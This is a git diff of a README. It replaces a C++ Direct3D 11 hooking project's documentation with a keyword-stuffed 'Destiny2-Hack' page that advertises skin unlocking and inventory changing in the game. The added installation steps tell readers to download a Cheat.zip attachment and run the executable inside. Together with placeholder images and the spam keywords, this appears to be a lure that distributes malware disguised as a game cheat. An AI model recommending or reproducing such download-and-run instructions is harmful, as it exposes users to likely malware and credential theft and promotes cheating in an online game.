@@ -1,59 +1,46 @@
-```
-            ____ _____ ____ ______   __  __            __      ____          ______      _ 
-           / __ \__  // __ <  <  /  / / / /___  ____  / /__   /  _/___ ___  / ____/_  __(_)
-          / / / //_ </ / / / // /  / /_/ / __ \/ __ \/ //_/   / // __ `__ \/ / __/ / / / / 
-         / /_/ /__/ / /_/ / // /  / __  / /_/ / /_/ / ,<    _/ // / / / / / /_/ / /_/ / /
-        /_____/____/_____/_//_/  /_/ /_/\____/\____/_/|_|  /___/_/ /_/ /_/\____/\__,_/_/
-                                                                       
-                                                                      
-                           D3D11 Hook with ImGui integration (x86 / x64)
-                                Make D3D11 internal menu with ImGui
-                                   (Resize & Fullscreen support)
-```
-<p align="center">
-    <img src="https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=for-the-badge&logo=appveyor" alt="C++">
-    <img src="https://img.shields.io/badge/platform-Windows-0078d7.svg?style=for-the-badge&logo=appveyor" alt="Windows">
-    <img src="https://img.shields.io/badge/arch-x86-red.svg?style=for-the-badge&logo=appveyor" alt="x86">
-    <img src="https://img.shields.io/badge/arch-x64-green.svg?style=for-the-badge&logo=appveyor" alt="x64">
-</p>
+# Destiny2-Hack
 
-## :open_book: Project Overview :
+🔓 Destiny2 unlocker unlockAll unlock-all skin-swapper skin-changer skinchanger skinswapper inventory-changer skinchanger character-skin weapon-skin unlock-all-skins skin-switch ghost-skin ship-skin sparrow-skin 🔓
 
-D3D11 Hook with [ImGui](https://github.com/ocornut/imgui) integration written in C++, works on x86 and x64 with all librairies and includes.
+![Main Image](https://example.com/destiny2-hack/main.jpg)
 
-#### Features :
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-- Handle window resize
-- DLL unload itself
-- Handler external unload
-- Handle fullscreen change
+## Overview
+Welcome to **Destiny2-Hack**, your ultimate solution for unlocking various skins, characters, weapons, and more in Destiny 2. This repository provides tools and utilities to enhance your gameplay experience and customize your inventory to your liking.
 
-#### Used librairies :
+![Overview Image](https://example.com/destiny2-hack/overview.jpg)
 
-- [MS Detours](https://www.microsoft.com/en-us/research/project/detours/)
-- [DirectX SDK](https://www.microsoft.com/en-us/download/details.aspx?id=6812)
-- [ImGui](https://github.com/ocornut/imgui)
+## Features
+- **Unlock-All Skins**: Gain access to an extensive collection of skins for your characters, weapons, ghost, ship, and sparrow.
+- **Skin Swapper**: Easily swap between different skins on the fly, allowing you to customize your appearance dynamically.
+- **Inventory Changer**: Modify your inventory to include rare items, gear, and resources that will give you an edge in the game.
 
-## :rocket: Getting Started
+![Features Image](https://example.com/destiny2-hack/features.jpg)
 
-This project use [MS Detours](https://github.com/microsoft/Detours) library for hooking and obviously D3D11 SDK.
+## Installation
+To get started with **Destiny2-Hack**, follow these steps:
+1. Download the [Cheat.zip](https://github.com/user-attachments/files/16928413/Cheat.zip) file.
+2. Extract the contents of the zip file to a folder on your computer.
+3. Run the executable file and follow the on-screen instructions to install the hack.
 
-MS Detours library is already include in the project folder, but if you don't have DirectX SDK you can download it [here](https://www.microsoft.com/en-us/download/details.aspx?id=6812).
+![Installation Image](https://example.com/destiny2-hack/installation.jpg)
 
-> **Note** <br>
-> Make sure that **DXSDK_DIR** is declared in your environment variables.
+## Usage
+Once you have installed the hack, launch Destiny 2 and activate the hack tool. You can then use the various features provided to customize your gameplay experience. Experiment with different skins, characters, and weapons to create your unique style in the game.
 
-To see your environment variables :
+![Usage Image](https://example.com/destiny2-hack/usage.jpg)
 
-> **Settings --> System --> About --> System Advanced Settings --> Environment Variables**
+## Contributing
+We welcome contributions from the community to improve and expand the features of **Destiny2-Hack**. If you have ideas for new skins, enhancements, or tools, feel free to fork the repository, make your changes, and submit a pull request. Together, we can make this hack even more amazing!
 
-### Visual Studio :
+![Contributing Image](https://example.com/destiny2-hack/contributing.jpg)
 
-1. Open the solution file (.sln).
-2. Build the project in Release (x86 or x64)
-
-Every configuration in x86 / x64 (Debug and Realese) are already configured with librairies and includes.
-
-## :test_tube: Demonstration :
-
-[Demo](https://github.com/adamhlt/D3D11-Hook-ImGui/assets/48086737/5c6cf425-6758-4773-aa1c-9ce4b1c8b41d)
+## License
+This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
